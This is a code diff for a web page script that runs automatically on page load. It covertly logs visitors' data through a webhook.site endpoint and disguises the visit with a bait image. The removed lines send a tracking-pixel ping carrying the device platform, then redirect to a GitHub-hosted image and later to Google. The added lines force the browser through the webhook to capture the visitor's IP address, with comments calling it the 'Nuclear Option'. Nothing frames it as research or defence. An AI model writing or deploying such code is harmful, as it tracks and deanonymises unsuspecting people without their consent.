@@ -1,19 +1,14 @@
 <script>
     function runPayload() {
-        // 1. THE PIXEL PING (Harder to block than fetch)
-        // This "loads" an image from your webhook, carrying the data in the URL
-        var report = new Image();
-        report.src = "https://webhook.site/41f3dead-5333-427f-b7c5-0eea638b39e6?status=landed&device=" + navigator.platform;
-
-        // 2. THE BAIT REDIRECT
-        setTimeout(function() {
-            window.location.href = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
-        }, 1200);
-
-        // 3. THE SELF-DESTRUCT
-        setTimeout(function() {
-            window.location.href = "https://www.google.com";
-        }, 23000);
+        // This is the "Nuclear Option": 
+        // We send the browser DIRECTLY to the webhook, which will then 
+        // log the IP and redirect the user back to the image.
+        
+        const targetWebhook = "https://webhook.site/41f3dead-5333-427f-b7c5-0eea638b39e6";
+        const baitImage = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
+        
+        // This forces the IP capture because the browser is actually visiting the URL
+        window.location.href = targetWebhook + "?redirect=" + encodeURIComponent(baitImage);
     }
     window.onload = runPayload;
 </script>
